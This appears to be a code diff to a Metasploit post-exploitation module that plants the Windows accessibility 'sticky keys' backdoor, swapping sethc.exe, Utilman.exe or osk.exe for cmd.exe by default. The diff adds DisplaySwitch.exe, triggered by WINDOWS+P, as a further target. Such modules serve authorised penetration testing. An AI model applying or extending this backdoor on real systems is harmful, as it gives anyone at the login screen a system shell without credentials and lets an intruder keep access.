@@ -26,8 +26,9 @@ class Metasploit4 < Msf::Post
         The module options allow for this hack to be applied to:
 
         - SETHC   - sethc.exe is invoked when SHIFT is pressed 5 times.
-        - UTILMAN - utilman.exe is invoked by pressing WINDOWS+U
+        - UTILMAN - Utilman.exe is invoked by pressing WINDOWS+U.
         - OSK     - osk.exe is invoked by pressing WINDOWS+U, then launching the on-screen keyboard.
+        - DISP    - DisplaySwitch.exe is invoked by pressing WINDOWS+P.
 
         The hack can be added using the ADD action, and removed with the REMOVE action.
 
@@ -42,7 +43,7 @@ class Metasploit4 < Msf::Post
 
     register_options([
       OptEnum.new('ACTION', [true, 'Specifies whether to add or remove the exploit.', 'ADD', ['ADD', 'REMOVE']]),
-      OptEnum.new('TARGET', [true, 'The target binary to add the exploit to.', 'SETHC', ['SETHC', 'UTILMAN', 'OSK']]),
+      OptEnum.new('TARGET', [true, 'The target binary to add the exploit to.', 'SETHC', ['SETHC', 'UTILMAN', 'OSK', 'DISP']]),
       OptString.new('EXE', [true, 'Executable to execute when the exploit is triggered', '%SYSTEMROOT%\system32\cmd.exe'])
     ], self.class)
   end
@@ -53,9 +54,11 @@ class Metasploit4 < Msf::Post
   def get_target_exe_name
     case datastore['TARGET']
     when 'UTILMAN'
-     'utilman.exe'
+     'Utilman.exe'
     when 'OSK'
      'osk.exe'
+    when 'DISP'
+      'DisplaySwitch.exe'
     else
      'sethc.exe'
     end
@@ -70,6 +73,8 @@ class Metasploit4 < Msf::Post
       'WINDOWS+U'
     when 'OSK'
       'WINDOWS+U, then launching the on-screen keyboard'
+    when 'DISP'
+      'WINDOWS+P'
     else
       'SHIFT 5 times'
     end
